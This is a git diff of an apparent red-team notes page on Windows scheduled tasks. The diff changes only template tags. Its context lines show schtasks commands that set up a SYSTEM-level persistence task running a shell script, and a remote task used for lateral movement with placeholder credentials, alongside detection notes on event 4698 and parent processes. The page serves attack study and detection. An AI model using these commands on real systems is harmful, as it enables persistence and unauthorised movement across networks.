@@ -8,13 +8,13 @@ description: 'Code execution, privilege escalation, lateral movement and persite
 
 Creating a new scheduled task that will launch shell.cmd every minute:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Observations
 
@@ -36,13 +36,13 @@ Also, look for events 4698 indicating new scheduled task creation:
 
 Note that when using schtasks for lateral movement, the processes spawned do not have taskeng.exe as their parent, rather - svchost:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/schtasks-remote.png)
 
